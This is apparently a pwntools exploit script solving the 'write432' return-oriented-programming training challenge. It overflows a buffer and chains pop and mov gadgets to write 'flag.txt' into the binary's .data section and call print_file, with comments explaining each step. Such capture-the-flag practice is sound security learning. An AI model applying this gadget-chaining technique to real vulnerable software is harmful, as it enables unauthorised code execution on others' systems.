# Useful command: pwndbg> disass usefulGadgets

from pwn import *

elf = context.binary = ELF('./write432', checksec=False)
context.log_level = 'debug'

io = process()

### To know which pop gadgets to use, first we need to find the mov gadget's pointer to see which register
### it is pointing into. In this case, it is pointing to edi

# mov <location_to_write>, <value_to_write>

mov_edi = 0x08048543		# mov dword ptr [edi], ebp; ret;
pop_edi = 0x080485aa		# pop edi; pop ebp; ret;
data = 0x0804a018			# .data section that is writable that we want to write (rabin2 -S write432)
ret = 0x08048386			# ret gadget

arg1 = b'flag'				# split string to be safe bcs the max is 8 bytes
arg2 = b'.txt'

payload = flat(							
	b'A' * 44,								
	pop_edi,				# Pop location to write (data) into edi register		
	data,	
	arg1,					
	mov_edi,				# Takes arg1 as argument and writes at the location pointed by edi (data location)
	pop_edi,
	data + 4,				# Pop location to write next (data + 4) into edi register
	arg2,			
	mov_edi,				# Takes arg1 as argument and writes at the location pointed by edi (data + 4 location)
	elf.plt['print_file'],	# Call function first
	ret,					
	data					# Load data argument that has been written to 'flag.txt'
)


io.sendline(payload)
io.interactive()


### FLOW: 	1) Prepare the where and what to write
###			2) Call function
###			3) Load arguments
